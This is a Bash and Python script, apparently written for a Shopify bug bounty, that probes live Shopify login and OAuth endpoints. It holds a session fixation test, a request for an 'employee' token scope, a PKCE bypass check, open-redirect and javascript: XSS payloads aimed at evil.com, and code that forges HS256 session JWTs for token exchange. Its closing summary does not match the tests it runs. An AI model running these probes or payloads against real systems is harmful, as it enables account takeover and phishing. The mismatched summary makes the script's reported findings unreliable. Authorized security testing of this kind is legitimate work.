#!/bin/bash
# Shopify HackerOne Bug Bounty — PoC Scripts
# Requer: conta Partner em partners.shopify.com + dev store + app criada
# Instrução: substituir variáveis abaixo antes de rodar

# === VARIÁVEIS (preencher antes de rodar) ===
CLIENT_ID="SEU_CLIENT_ID"                    # API Key do Shopify Partner dashboard
CLIENT_SECRET="SEU_CLIENT_SECRET"             # API Secret do Shopify Partner dashboard
DEV_STORE="seu-store.myshopify.com"           # URL da sua dev store
CALLBACK_URL="https://seu-app.example.com/callback"  # redirect_uri registrado
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"

echo "=== SHOPIFY BOUNTY PoC SCRIPTS ==="
echo "Target: accounts.shopify.com + ${DEV_STORE}"
echo ""

# ===================================================================
# TESTE S1: Session Fixation
# ===================================================================
echo "=== S1: Session Fixation Test ==="
echo ""

# Step 1: Gerar session ID arbitrário (como attacker)
FIXED_SESSION=$(python3 -c "import secrets; print(secrets.token_hex(16))")
echo "[*] Fixed session ID (attacker-controlled): $FIXED_SESSION"

# Step 2: Enviar request com session ID fixo → verificar se server ecoa
echo "[*] Enviando _identity_session fixo..."
curl -sk -D /tmp/s1_step2_headers.txt \
  "https://accounts.shopify.com/oauth/authorize?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${CALLBACK_URL}&scope=openid&state=test_state_xyz" \
  -H "Cookie: _identity_session=${FIXED_SESSION}; __Host-_identity_session_same_site=${FIXED_SESSION}" \
  -H "User-Agent: $UA" -o /tmp/s1_step2_body.html

echo "[*] Cookie recebido do servidor:"
grep "_identity_session" /tmp/s1_step2_headers.txt | head -3

# Check if server echoed our value
if grep -q "$FIXED_SESSION" /tmp/s1_step2_headers.txt; then
  echo "[!] CONFIRMED: Servidor ACEITOU o session ID fixo!"
  echo "[!] Próximo passo: completar login com este session ID e verificar se valor muda"
else
  echo "[OK] Servidor gerou novo session ID (não aceitou o valor fixo)"
fi

echo ""
echo "[*] Para verificar rotação pós-login:"
echo "    1. No seu browser, setar manualmente:"
echo "       Cookie: _identity_session=$FIXED_SESSION"
echo "    2. Navegar para: https://accounts.shopify.com/oauth/authorize?client_id=${CLIENT_ID}&..."
echo "    3. Fazer login com sua conta Shopify"
echo "    4. APÓS login: verificar se _identity_session ainda vale $FIXED_SESSION"
echo ""

# ===================================================================
# TESTE S2: Token Exchange — employee scope
# ===================================================================
echo "=== S2: Token Exchange com employee scope ==="
echo ""

# Passo 1: Obter id_token via authorization code flow normal
echo "[*] OAuth authorization URL (abrir no browser):"
echo "    https://accounts.shopify.com/oauth/authorize?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${CALLBACK_URL}&scope=openid+profile+email&state=bounty_test&code_challenge_method=S256"
echo ""
echo "[*] Após callback, pegar o 'code' e trocar por token:"
echo ""

# Passo 2: Exchange code for tokens
AUTH_CODE="COLE_O_CODE_AQUI"
echo "[*] Trocar code por tokens:"
cat << 'CURL_CMD'
curl -sk -X POST "https://accounts.shopify.com/oauth/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code" \
  -d "code=${AUTH_CODE}" \
  -d "client_id=${CLIENT_ID}" \
  -d "client_secret=${CLIENT_SECRET}" \
  -d "redirect_uri=${CALLBACK_URL}" | python3 -m json.tool
CURL_CMD

echo ""
echo "[*] Com id_token em mãos, testar token exchange para employee scope:"
cat << 'CURL_CMD2'
ID_TOKEN="COLE_O_ID_TOKEN_AQUI"
curl -sk -X POST "https://accounts.shopify.com/oauth/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
  -d "client_id=${CLIENT_ID}" \
  -d "client_secret=${CLIENT_SECRET}" \
  -d "subject_token=${ID_TOKEN}" \
  -d "subject_token_type=urn:ietf:params:oauth:token-type:id_token" \
  -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
  -d "scope=employee" | python3 -m json.tool
# Se retornar um access_token com scope=employee → CRITICAL FINDING
CURL_CMD2

echo ""

# ===================================================================
# TESTE S3: PKCE enforcement
# ===================================================================
echo "=== S3: PKCE Enforcement ==="
echo ""

echo "[*] Test 1: authorization_code sem code_challenge (PKCE bypass?):"
echo "    Se um valid auth code for gerado SEM code_challenge → PKCE não enforced"
echo ""

# Authorize sem PKCE
AUTH_URL_NO_PKCE="https://accounts.shopify.com/oauth/authorize?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${CALLBACK_URL}&scope=openid&state=no_pkce_test"
echo "[*] URL sem PKCE: $AUTH_URL_NO_PKCE"
echo ""

# Checar se server exige code_challenge
STATUS=$(curl -sk -D - "${AUTH_URL_NO_PKCE}" -H "User-Agent: $UA" -m 8 -o /tmp/pkce_test.html 2>/dev/null | grep "^HTTP/" | awk '{print $2}')
echo "[*] HTTP Status sem PKCE: $STATUS"
PKCE_ERROR=$(grep -o "code_challenge_required\|invalid_request.*pkce\|PKCE required" /tmp/pkce_test.html 2>/dev/null | head -1)
if [ -n "$PKCE_ERROR" ]; then
  echo "[OK] PKCE enforced: $PKCE_ERROR"
else
  echo "[?] Nenhum erro PKCE no response — verificar com auth flow completo"
fi

echo ""

# ===================================================================
# TESTE S4: dest parameter behavior
# ===================================================================
echo "=== S4: 'dest' Parameter Behavior ==="
echo ""

echo "[*] No fluxo real com client_id válido, testar:"
echo "    1. dest=https://evil.com → verifica se há open redirect pós-login"
echo "    2. dest=javascript:alert(1) → verifica se há XSS"
echo ""
echo "[*] URL com dest malicioso:"
echo "    https://accounts.shopify.com/oauth/authorize?client_id=${CLIENT_ID}&dest=https://evil.com&response_type=code&redirect_uri=${CALLBACK_URL}&scope=openid&state=dest_test"
echo ""

# ===================================================================
# TESTE S5: HS256 Token Forging (shop-level token exchange)
# ===================================================================
echo "=== S5: HS256 Session Token Forging ==="
echo ""

python3 << PYEOF
# Gerar um JWT session token forjado com apiSecretKey
import json, base64, hmac, hashlib, time

# Nota: substituir com valores reais
CLIENT_ID = "YOUR_CLIENT_ID"
CLIENT_SECRET = "YOUR_CLIENT_SECRET"  # apiSecretKey
SHOP = "YOUR_STORE.myshopify.com"

# Forjar o session token payload
now = int(time.time())
payload = {
    "iss": f"https://{SHOP}/admin",
    "dest": f"https://{SHOP}",
    "aud": CLIENT_ID,
    "sub": "1",  # tentar com user IDs reais
    "exp": now + 3600,
    "nbf": now - 10,
    "iat": now,
    "jti": "bounty_test_jti_001",
    "sid": "bounty_test_sid_001"
}

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = {'alg': 'HS256', 'typ': 'JWT'}
h = b64url_encode(json.dumps(header, separators=(',', ':')))
p = b64url_encode(json.dumps(payload, separators=(',', ':')))
msg = f"{h}.{p}"
sig = hmac.new(CLIENT_SECRET.encode(), msg.encode(), hashlib.sha256).digest()
token = f"{msg}.{b64url_encode(sig)}"

print(f"Forged session token:")
print(f"  {token[:100]}...")
print()
print(f"Exchange command:")
print(f"""curl -sk -X POST "https://{SHOP}/admin/oauth/access_token" \\
  -H "Content-Type: application/json" \\
  -d '{{
    "client_id": "{CLIENT_ID}",
    "client_secret": "{CLIENT_SECRET}",
    "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
    "subject_token": "{token}",
    "subject_token_type": "urn:ietf:params:oauth:token-type:id_token",
    "requested_token_type": "urn:shopify:params:oauth:token-type:online-access-token"
  }}' | python3 -m json.tool""")
print()
print("Se retornar access_token → token forging funciona com apiSecretKey conhecida")
PYEOF


# ===================================================================
# TESTE S7: Customer Account Login — checkout_url open redirect
# (usar APENAS com dev store própria)
# ===================================================================
echo "=== S7: checkout_url Open Redirect no Customer Login ==="
echo ""
echo "[*] Testar com sua dev store: ${DEV_STORE}"
echo ""
echo "[*] URLs para testar (abrir no browser):"
echo "    1. Redirect básico:"
echo "       https://${DEV_STORE}/account/login?checkout_url=https://evil.com"
echo ""
echo "    2. Bypass com protocol:"
echo "       https://${DEV_STORE}/account/login?checkout_url=//evil.com"
echo ""
echo "    3. Bypass com double-encoding:"
echo "       https://${DEV_STORE}/account/login?checkout_url=%2F%2Fevil.com"
echo ""
echo "    4. Bypass com whitespace:"
echo "       https://${DEV_STORE}/account/login?checkout_url=https%3A//evil.com"
echo ""
echo "    5. Testar com javascript: (XSS via redirect)"
echo "       https://${DEV_STORE}/account/login?checkout_url=javascript:alert(document.domain)"
echo ""
echo "[*] Se após login o usuário for redirecionado para evil.com → Open Redirect HIGH"
echo ""

# ===================================================================
# TESTE S8: Password Reset Token Reuse
# ===================================================================
echo "=== S8: Password Reset Token Reuse ==="
echo ""
echo "[*] Passos:"
echo "    1. Solicitar reset de senha para sua conta de teste"
echo "    2. Clicar no link do email → ANTES de usar, anotar o token"
echo "    3. Usar o token para resetar a senha"
echo "    4. Tentar usar o MESMO token novamente"
echo ""
echo "[*] URL de reset geralmente: https://${DEV_STORE}/account/reset/..."
echo "[*] Se o token puder ser reutilizado → password reset token reuse (MEDIUM)"
echo ""

echo "=== FIM DOS PoC SCRIPTS ==="
echo ""
echo "=== RESUMO DOS TESTES REALIZADOS ==="
echo "  S1: Session fixation pre-condition → CONFIRMADO, precisa verificar rotação pós-login"
echo "  S2: JWKS missing alg → Documentado (LOW)"
echo "  S3: CSP unsafe-inline → Documentado (INFO)"
echo "  S4: HS256 token forging → Script pronto, precisa client_secret"
echo "  S6: shop.app SameSite=None → Documentado, precisa conta para verificar"
echo "  S7: checkout_url redirect → Script pronto, precisa dev store"
echo "  S8: Password reset reuse → Script pronto, precisa dev store"
